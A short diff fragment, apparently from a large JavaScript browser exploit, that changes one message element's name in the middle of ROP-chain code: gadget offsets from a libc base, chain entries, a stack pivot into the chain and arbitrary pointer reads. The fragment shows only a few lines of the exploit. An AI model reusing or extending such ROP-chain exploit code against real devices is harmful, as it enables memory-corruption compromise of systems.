@@ -26516,7 +26516,7 @@ libc_base+811575
 db([0, 0]); 
 
 db([2, 0, 0, 0, 0, 0]);
-window.msgs.innerHTML= LoadedMSG
+window.msgs2.innerHTML= LoadedMSG
 setTimeout(function(){pivot(ropchain);},500);
 var main_ret = read_ptr_at(main_ret);
 var printf_buf_end = read_ptr_at(ropchain+printf_buf_offset);
